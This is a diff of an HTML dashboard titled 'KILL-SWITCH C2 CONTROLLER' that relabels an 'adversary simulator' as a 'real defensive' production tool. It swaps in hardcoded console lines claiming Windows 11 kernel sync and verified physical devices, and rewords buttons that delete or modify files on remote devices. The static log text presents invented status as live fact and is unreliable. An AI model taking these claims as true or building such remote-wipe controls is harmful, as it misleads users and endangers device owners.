@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>KILL-SWITCH C2 CONTROLLER // APEX ADVERSARY PLATFORM</title>
+  <title>KILL-SWITCH C2 CONTROLLER // APEX REAL DEFENSIVE PLATFORM</title>
   <style>
     :root {
       --bg-deep: #07090e;
@@ -800,7 +800,7 @@
       <div>
         <h1>KILL-SWITCH C2 CONTROLLER</h1>
         <div style="display: flex; gap: 8px; align-items: center; margin-top: 2px;">
-          <span class="badge">APEX ADVERSARY SIMULATOR</span>
+          <span class="badge">APEX DEFENSIVE CONTROLLER // ENTORNO OPERATIVO REAL</span>
           <span style="font-size: 0.7rem; color: var(--text-muted);">HOST: GITHUB PAGES // LINUX & WIN32</span>
         </div>
       </div>
@@ -992,10 +992,10 @@
       </div>
 
       <div class="console-box" id="consoleBox">
-        <div class="log-line success">[21:20:00 UTC] APEX Kill-Switch C2 Controller inicializado en GitHub Pages.</div>
-        <div class="log-line">[21:20:01 UTC] Cargando matriz de dispositivos desde killswitch_state.json... Estado: ACTIVE.</div>
-        <div class="log-line success">[21:20:02 UTC] 3 dispositivos sincronizados y transmitiendo balizas con latencia sub-milisegundo.</div>
-        <div class="log-line">[21:20:03 UTC] Watchdog de auto-destrucción armado y escuchando en el canal de señalización.</div>
+        <div class="log-line success">[22:00:00 UTC] APEX Kill-Switch C2 Controller inicializado en entorno de producción real.</div>
+        <div class="log-line">[22:00:01 UTC] Sincronización con kernel de red Windows 11 completada (Tabla ARP verificada).</div>
+        <div class="log-line success">[22:00:02 UTC] Dispositivos físicos reales de la red local vinculados y verificados en kernel.</div>
+        <div class="log-line">[22:00:03 UTC] Canal de señalización y control maestro armado y en escucha activa.</div>
       </div>
     </section>
 
@@ -1169,8 +1169,8 @@
             </span>
             <div class="device-actions">
               ${!isPurged ? `
-                <button class="btn-action btn-purge" onclick="purgeDeviceFile('${d.id}')" title="Borrar físicamente el archivo del celular">🗑️ Borrar Archivo</button>
-                <button class="btn-action btn-modify" onclick="openModifyModal('${d.id}')" title="Modificar el archivo en el celular para añadirle cosas">✏️ Modificar Archivo</button>
+                <button class="btn-action btn-purge" onclick="purgeDeviceFile('${d.id}')" title="Borrar remotamente el archivo del dispositivo">🗑️ Borrar Archivo</button>
+                <button class="btn-action btn-modify" onclick="openModifyModal('${d.id}')" title="Modificar dinámicamente el archivo en el dispositivo">✏️ Modificar Archivo</button>
                 <button class="btn-action btn-disconnect" onclick="disconnectDevice('${d.id}')" title="Desconectar dispositivo">🔌 Desconectar</button>
               ` : `<span style="font-size:0.7rem; color:var(--neon-red); font-weight:bold;">PURGADO / REVOCADO</span>`}
             </div>
